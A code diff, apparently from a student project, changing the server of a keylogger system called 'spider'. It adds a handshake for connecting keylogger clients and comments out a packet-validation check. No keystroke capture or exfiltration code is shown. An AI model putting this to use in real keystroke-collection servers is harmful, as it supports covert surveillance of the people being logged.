@@ -5,7 +5,7 @@
 // Login   <gandoulf@epitech.net>
 //
 // Started on  Sat Nov 12 11:24:36 2016 Gandoulf
-// Last update Sun Nov 13 17:59:37 2016 Gandoulf
+// Last update Sun Nov 13 20:33:45 2016 Gandoulf
 //
 
 #include "socket/socketC/serverTcpSocketC.hpp"
@@ -16,7 +16,8 @@ namespace spider
   {
     user::user(Socket::Server & server, std::set<user_ptr> & clients, SqlServer &sqlServer,
 	       int fd, std::mutex & Mclients)
-      : _server(server), _clients(clients), _sqlServer(sqlServer), _fd(fd), _Mclients(Mclients)
+      : _server(server), _clients(clients), _sqlServer(sqlServer), _fd(fd), _Mclients(Mclients),
+	_firstRead(true)
     {
     }
 
@@ -47,10 +48,28 @@ namespace spider
       std::cout << "disconnection" << std::endl;
     }
 
-    void user::read()
+    void user::read(size_t length)
     {
-
-      readHeader();
+      if (/*_firstRead &&*/ length == 17)
+	{
+	  _firstRead = false;
+	  memset(&_data[0], 0, 128);
+	  _server.read(_fd, static_cast<void *>(_data), 11 + 6); //jerem <3
+	  std::cout << _data << std::endl;
+	  if (!strncmp(_data, "client keylogger\n", 17))
+	    {
+	      char *firstMsg = new char[21];
+	      std::memcpy(firstMsg, "client keylogger ok.\n", 21);
+	      _messages.push_back(firstMsg);
+	      _messagesSize.push_back(21);
+	      std::cout << "sending message" << std::endl;
+	    }
+	  //else if (!_firstRead)
+	  else if (length >= sizeof(PackageHeader))
+	    disconnect();
+	}
+      else
+	readHeader();
     }
 
     void user::doWrite()
@@ -75,6 +94,10 @@ namespace spider
       memset(&_data[0], 0, 128);
       _server.read(_fd, static_cast<void *>(_data), sizeof(PackageHeader));
       _packet.setHeader(_data, sizeof(PackageHeader));
+      /*if (_packet.getHeader().magicNumber != SEND ||
+	  _packet.getHeader().magicNumber != REC ||
+	  _packet.getHeader().size > 1000)
+	  disconnect();*/
       readData();
     }
 
@@ -118,7 +141,7 @@ namespace spider
 			    {
 			      if (_clientsFD.size() == 0)
 				return ;
-			      _clientsFD[fd].get()->read();
+			      _clientsFD[fd].get()->read(length);
 			    });
       _server.OnWritePossible([this](Socket::Server & server, int fd)
 			     {
